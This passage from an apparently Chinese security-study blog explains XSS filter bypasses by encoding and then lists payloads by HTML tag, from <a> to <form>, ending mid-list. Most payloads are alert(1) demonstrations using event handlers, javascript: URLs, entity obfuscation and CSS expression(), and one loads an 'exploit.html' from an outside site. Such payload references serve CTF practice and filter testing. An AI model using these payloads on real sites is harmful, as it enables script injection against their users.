<code>利用编码进行绕过</code></p><blockquote><p>根据题目的规则，进行相应的<a href="[https://muzibing.github.io/2020/02/24/2020.02.24%EF%BC%8895%EF%BC%89/](https://muzibing.github.io/2020/02/24/2020.02.24（95）/">HTML 编码、URI 编码和Javascript 编码</a>)，其中对<code>javascript:</code> 进行实体编码来绕过的方法很有用。</p><p><code>相关题目</code>：<a href="[https://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x0b-%E4%BC%AA%E5%8D%8F%E8%AE%AEfont](https://muzibing.github.io/2020/03/08/2020.03.08（99）/#font-color-navy0x0b-伪协议font">xss challenges_0x0B</a>)</p><p>如果再对 <code>(</code> 和 <code>=</code>进行过滤，那么又只能在<code>&lt;script&gt;</code>标签内部执行函数的话，还只能通过实体编码绕过，那么就需要用到一个标签 <a href="[https://muzibing.github.io/2020/02/24/2020.02.24%EF%BC%8895%EF%BC%89/#%E4%B8%89%E3%80%81%E8%AF%A6%E8%A7%A3%E6%AF%8F%E6%9D%A1%E5%8E%9F%E5%9B%A0](https://muzibing.github.io/2020/02/24/2020.02.24（95）/#三、详解每条原因"><code>&lt;svg&gt;</code>的特性</a>)</p><p><code>相关题目</code>：<a href="[https://muzibing.github.io/2020/03/08/2020.03.08%EF%BC%8899%EF%BC%89/#font-color-navy0x0b-%E4%BC%AA%E5%8D%8F%E8%AE%AEfont](https://muzibing.github.io/2020/03/08/2020.03.08（99）/#font-color-navy0x0b-伪协议font">prompt.ml_0x02</a>)</p></blockquote><h4 id="6-toUppercase-的过滤"><a href="#6-toUppercase-的过滤" class="headerlink" title="6.toUppercase() 的过滤"></a>6.<code>toUppercase()</code> 的过滤</h4><p>※ <code>利用unicode或js隐式转换</code></p><blockquote></blockquote><h3 id="二、各标签常见的-xss-payload"><a href="#二、各标签常见的-xss-payload" class="headerlink" title="二、各标签常见的 xss payload"></a>二、各标签常见的 <code>xss payload</code></h3><p><code>按照字母书写顺序进行排列</code></p><h4 id="◈-lt-a-gt-标签"><a href="#◈-lt-a-gt-标签" class="headerlink" title="◈ &lt;a&gt;标签"></a>◈ <code>&lt;a&gt;</code>标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">+++++++++++++++++ 十六进制编码实体 ++++++++++++++++++</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(/xss/)"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // javascript不区分大小写</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2F;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2F;&amp;#x29;"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;%61%6c%65%72%74%28%2f%78%73%73%2f%29"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;\u0061\u006c\u0065\u0072\u0074('\u002f\u0078\u0073\u0073\u002f')"</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">alert(/xss/)</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 十六进制编码不区分大小写 </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"     javascript:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 协议之前允许使用字符\x01-\x20</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javas    cript:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 协议中允许使用字符\x09（\t-&amp;Tab;），\x0a（\n-&amp;NewLine;），\x0d（\）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:x='&amp;percnt;27-alert(1)-%27';"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // HTML实体和URL编码</span><br><span class="line">++++++++++++ 如果下一个字符不是a-f0-9，则不使用分号的十六进制编码 ++++++++++++</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"j&amp;#x61vascript:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a</span></span></span><br><span class="line"><span class="tag"><span class="string">avascript:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a avascript:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">++++++++++++++++++++HTML 实体++++++++++++++++++++++++++++++++</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript&amp;colon;alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"java&amp;Tab;script:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"java&amp;NewLine;script:alert(1)"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript&amp;colon;alert&amp;lpar;1&amp;rpar;"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">----------------------------------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:x='%27-alert(1)-%27';"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 网址编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:x='&amp;percnt;27-alert(1)-%27';"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // HTML实体和URL编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">eval(alert(/xss/))</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要点击一下元素（Chrome、Firefox、IE、Safari)</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">onactivate</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 激活元素时触发(IE)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">onbeforeactivate</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> //在激活元素之前触发（IE）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onblur</span>=<span class="string">alert(1)</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span> // 当元素失去焦点时触发（Chrome、IE、Safari）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 当元素具有焦点时触发（Chrome、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">tabindex</span>=<span class="string">1</span> <span class="attr">onfocusin</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 当元素具有焦点时触发（Chrome、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onbeforecopy</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要复制一段文字（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onbeforecut</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 要求剪切一段文字（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">oncontextmenu</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 右键单击以显示上下文菜单时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">oncopy</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要复制一段文字（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">oncut</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 要求剪切一段文字（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onpaste</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要粘贴一段文字（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">ondblclick</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 双击元素时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">"true"</span> <span class="attr">ondrag</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 触发拖动元素（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">"true"</span> <span class="attr">ondragend</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 触发拖动已在元素上完成（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">"true"</span> <span class="attr">ondragenter</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要鼠标拖动（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">"true"</span> <span class="attr">ondragleave</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 同上</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onkeydown</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 按下键时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onkeypress</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 同上</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onkeyup</span>=<span class="string">"alert(1)"</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 释放按键时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmousedown</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 按下鼠标时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseenter</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 当鼠标悬停在元素上时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseleave</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 当鼠标移离元素时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmousemove</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要鼠标移动（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseout</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 当鼠标移离元素时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 需要将鼠标悬停在元素上（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseup</span>=<span class="string">"alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 释放鼠标按钮时触发（Chrome、Firefox、IE、Safari)</span><br></pre></td></tr></table></figure><h4 id="◈-lt-audio-gt-标签"><a href="#◈-lt-audio-gt-标签" class="headerlink" title="◈ &lt;audio&gt; 标签"></a>◈ <code>&lt;audio&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span> // 资源加载失败或导致错误时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">oncanplay</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"horse.ogg"</span> <span class="attr">type</span>=<span class="string">"audio/wav"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 如果资源可以播放则触发（Chrome、Firefox、IE、Safari) <span class="tag">&lt;<span class="name">video</span>&gt;</span> 标签也可以</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span> <span class="attr">autoplay</span> <span class="attr">onended</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"mov_bbb.mp4"</span> <span class="attr">type</span>=<span class="string">"audio/wav"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 资源播放完毕时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">onloadeddata</span>=<span class="string">alert(1)</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"horse.mp3"</span> <span class="attr">type</span>=<span class="string">"audio/mp3"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 加载第一帧时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">onloadedmetadata</span>=<span class="string">alert(1)</span>&gt;</span> <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"horse.mp3"</span> <span class="attr">type</span>=<span class="string">"audio/mp3"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 加载元数据时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">onplay</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span>  <span class="attr">src</span>=<span class="string">"horse.mp3"</span> <span class="attr">type</span>=<span class="string">"audio/mp3"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 播放资源时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">onplaying</span>=<span class="string">alert(1)</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"horse.mp3"</span> <span class="attr">type</span>=<span class="string">"audio/mp3"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 触发资源正在播放（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span> <span class="attr">autoplay</span> <span class="attr">ontimeupdate</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"validaudio.wav"</span> <span class="attr">type</span>=<span class="string">"audio/wav"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 更改时间轴时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onpause</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"movie.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 需要点击元素才能暂停（Chrome、Firefox、IE、Safari)（video 同理）</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onseeked</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"movie.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 需要点击元素时间轴（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onseeking</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"validaudio.wav"</span> <span class="attr">type</span>=<span class="string">"audio/wav"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 同上</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onvolumechange</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"movie.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span> // 需要调节音量（Chrome、Firefox、IE、Safari)</span><br></pre></td></tr></table></figure><h4 id="◈-lt-body-gt-标签"><a href="#◈-lt-body-gt-标签" class="headerlink" title="◈ &lt;body&gt; 标签"></a>◈ <code>&lt;body&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onafterprint</span>=<span class="string">alert(1)</span>&gt;</span>  // 页面打印后触发（Chrome、Firefox、IE)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onbeforeprint</span>=<span class="string">alert(1)</span>&gt;</span> // 在页面打印前触发（Chrome、Firefox、IE)</span><br><span class="line">body&#123;background-image:url(javascript:alert("xss"))&#125; //在CSS代码中加入javascript和vbscript脚本</span><br><span class="line">body&#123;xss:\0065xpression(alert('xss'))&#125;'//将e转换为\0065</span><br><span class="line">body&#123;background-image:\0075\0072\006c…&#125;'将url全转为16进制</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onhashchange</span>=<span class="string">"alert(1)"</span>&gt;</span> // 如果哈希值更改，则触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onmessage</span>=<span class="string">alert(1)</span>&gt;</span> // 当从postMessage调用接收到消息事件时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span> // 显示页面时触发（Chrome、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpopstate</span>=<span class="string">alert(1)</span>&gt;</span> // 历史记录更改时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onresize</span>=<span class="string">"alert(1)"</span>&gt;</span> // 调整窗口大小时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onscroll</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">height:1000px</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> // 页面滚动时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onunhandledrejection</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">fetch(<span class="string">'//xyz'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 未履行承诺时触发（Firefox)</span><br></pre></td></tr></table></figure><h4 id="◈-lt-button-gt-标签"><a href="#◈-lt-button-gt-标签" class="headerlink" title="◈ &lt;button&gt; 标签"></a>◈ <code>&lt;button&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span>/<span class="attr">onclick</span>=<span class="string">alert(/xss/)</span>&gt;</span>/xss/<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript&amp;colon;alert(1)</span>&gt;</span>M //需要交互</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span> // 不需要交互</span><br></pre></td></tr></table></figure><h4 id="◈-lt-details-gt-标签"><a href="#◈-lt-details-gt-标签" class="headerlink" title="◈ &lt;details&gt; 标签"></a>◈ <code>&lt;details&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">ontoggle</span>=<span class="string">alert(1)</span> <span class="attr">open</span>&gt;</span>test<span class="tag">&lt;/<span class="name">details</span>&gt;</span> // 展开详细信息标签时触发（Chrome、Firefox、IE、Safari)</span><br></pre></td></tr></table></figure><h4 id="◈-lt-div-gt-标签"><a href="#◈-lt-div-gt-标签" class="headerlink" title="◈ &lt;div&gt; 标签"></a>◈ <code>&lt;div&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>/<span class="attr">onmouseover</span>=<span class="string">'alert(1)'</span>&gt;</span>X</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">STYLE</span>=<span class="string">"background-image: url(javascript:alert('XSS'))"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">STYLE</span>=<span class="string">"behaviour: url('http://www.how-to-hack.org/exploit.html');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">STYLE</span>=<span class="string">"width: expression(alert('XSS'));"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">draggable</span>=<span class="string">"true"</span> <span class="attr">contenteditable</span>&gt;</span>drag me<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">ondragover</span>=<span class="string">alert(1)</span> <span class="attr">contenteditable</span>&gt;</span>drop here<span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 触发删除可拖动元素（Chrome、Firefox、IE、Safari)</span><br></pre></td></tr></table></figure><h4 id="◈-lt-embed-gt-标签"><a href="#◈-lt-embed-gt-标签" class="headerlink" title="◈ &lt;embed&gt; 标签"></a>◈ <code>&lt;embed&gt;</code> 标签</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed src=&quot;javascript:alert(1)&quot;&gt; // 使用JavaScript协议嵌入src属性Firefox</span><br></pre></td></tr></table></figure><h4 id="◈-lt-form-gt-标签"><a href="#◈-lt-form-gt-标签" class="headerlink" title="◈ &lt;form&gt; 标签"></a>◈ <code>&lt;form&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"Javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span 